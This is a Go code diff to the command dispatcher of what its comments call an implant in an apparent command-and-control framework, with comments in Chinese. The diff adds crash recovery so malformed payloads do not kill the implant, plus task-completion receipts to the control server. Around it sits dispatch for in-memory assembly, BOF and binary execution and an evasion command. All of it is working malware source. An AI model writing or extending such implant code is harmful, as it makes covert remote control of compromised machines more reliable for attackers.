@@ -24,10 +24,19 @@ var (
 // 本函数不感知具体协议。
 func HandleCommand(data []byte) {
 	// K2: 命令分发入口 panic 防护——畸形/被篡改载荷导致的 slice 越界等
-	// 不得崩溃整个植入体（原无 recover，短包即可进程崩溃失联）
+	// 不得崩溃整个植入体（原无 recover，短包即可进程崩溃失联）。
+	// 插件/内存执行命令还要把 panic 作为 EXEC_DONE 失败回执上报，否则
+	// 服务端任务会一直停在 dispatched 直到 6h 超时。
+	var execCmd bool
+	var execTaskID uint32
 	defer func() {
 		if r := recover(); r != nil {
-			debuglog.Printf("❌ [APP-RECOVER] 命令处理 panic 已捕获: %v\n", r)
+			err := fmt.Errorf("命令处理 panic: %v", r)
+			debuglog.Printf("❌ [APP-RECOVER] %v\n", err)
+			communication.ErrorProcess(err)
+			if execCmd {
+				communication.ExecDone(execTaskID, false, err.Error())
+			}
 		}
 	}()
 
@@ -38,6 +47,20 @@ func HandleCommand(data []byte) {
 
 	cmdType := binary.BigEndian.Uint32(data[:4])
 	cmdBuf := data[4:]
+
+	// 插件/内存执行任务头：能力客户端会收到 "EXD1" + 4B taskID 前缀，
+	// 其余命令不受影响。旧服务端不下发该头，taskID 保持 0。
+	if isExecCommand(int(cmdType)) {
+		execCmd = true
+		if len(cmdBuf) >= 8 && string(cmdBuf[:4]) == "EXD1" {
+			execTaskID = binary.BigEndian.Uint32(cmdBuf[4:8])
+			cmdBuf = cmdBuf[8:]
+		} else {
+			// 服务端没带任务头：可能是旧服务端，也可能是服务端重启后能力表丢失。
+			// 补报一次能力，下一次执行就能拿到 taskID（本次按 taskID=0 回执）。
+			communication.ReportExecCapability()
+		}
+	}
 
 	// 心跳 ack（type=3 空载荷）：仅存活探测，非命令，静默忽略。
 	// 部分传输层（single/新版 adapter）已在 Recv 丢弃，此处兜底兼容旧路径。
@@ -259,7 +282,7 @@ func HandleCommand(data []byte) {
 		callbackType = 0
 	case services.ExecuteAssembly:
 		debuglog.Printf("🚀 [Windows内存执行] 收到ExecuteAssembly命令 [%d]\n", services.ExecuteAssembly)
-		result, err = services.CmdExecuteAssembly(cmdBuf)
+		result, err = services.CmdExecuteAssembly(cmdBuf, execTaskID)
 		callbackType = 0
 	case services.InlineBin:
 		debuglog.Printf("🚀 [Windows内存执行] 收到InlineBin命令 [%d]\n", services.InlineBin)
@@ -448,6 +471,11 @@ func HandleCommand(data []byte) {
 		debuglog.Printf("🔐 [对抗] 收到EVASION命令 [%d] 参数=%q\n", services.EVASION, string(cmdBuf))
 		result, err = services.CmdEvasion(cmdBuf)
 		callbackType = 0
+	case services.EXEC_OUTPUT_ENABLE:
+		// 服务端确认支持 EXEC_OUTPUT：后续执行输出改用 type=98，
+		// 不再让过程输出触发服务端任务完成。
+		communication.EnableExecOutput()
+		callbackType = -1
 	default:
 		debuglog.Printf("❌ [命令错误] 不支持的命令类型: %d\n", cmdType)
 		err = fmt.Errorf("not supported command: %d", cmdType)
@@ -455,7 +483,34 @@ func HandleCommand(data []byte) {
 
 	if err != nil {
 		communication.ErrorProcess(err)
+		// 执行类命令：错误也必须收敛任务，否则服务端只会看到一条 xterm 提示，
+		// 任务一直 dispatched（前端 10 分钟后才判超时）。
+		if execCmd {
+			communication.ExecDone(execTaskID, false, err.Error())
+		}
 	} else if callbackType >= 0 {
-		communication.DataProcess(callbackType, result)
+		// 空结果不再回包：避免 appending 空行，也避免空 type-0 误触发任务完成。
+		if len(result) > 0 {
+			communication.DataProcess(callbackType, result)
+		}
+		// ExecuteAssembly 是异步执行：完成回执由后台 goroutine 在真正结束时发，
+		// 这里只处理其余同步执行模式。
+		if execCmd && int(cmdType) != services.ExecuteAssembly {
+			communication.ExecDone(execTaskID, true, "")
+		}
 	}
+}
+
+// isExecCommand 判断是否为插件/内存执行命令（需要 EXEC_DONE 收敛任务）。
+func isExecCommand(cmdType int) bool {
+	switch cmdType {
+	case services.ExecuteAssembly,
+		services.InlineBin,
+		services.ExecuteLinuxScript,
+		services.ExecuteLinuxBin,
+		services.ExecuteBof,
+		services.ExecuteFile:
+		return true
+	}
+	return false
 }
